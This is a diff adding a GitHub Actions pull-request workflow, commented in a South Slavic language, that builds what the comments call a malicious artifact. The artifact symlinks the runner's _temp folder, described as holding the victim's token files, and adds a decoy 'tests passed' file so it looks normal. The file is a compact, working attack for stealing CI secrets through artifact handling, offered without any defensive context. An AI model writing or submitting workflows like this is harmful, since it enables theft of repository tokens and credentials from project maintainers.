@@ -1,0 +1,22 @@
+name: PR Builder
+on: [pull_request]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Pravljenje Zlog Artefakta
+        run: |
+          mkdir payload_dir
+          # Ovo je magija: Pravimo symlink koji pokazuje na tajni folder Runnera zrtve!
+          # Folder gdje GitHub cuva token fajlove se zove _temp
+          ln -s /home/runner/work/_temp/ payload_dir/tajne_zrtve
+          
+          # Dodajemo obican fajl da izgleda normalno
+          echo "Testovi prosli" > payload_dir/test_results.txt
+          
+      - name: Slanje Artefakta Zrtvi
+        uses: actions/upload-artifact@v3
+        with:
+          name: pr_payload
+          path: payload_dir
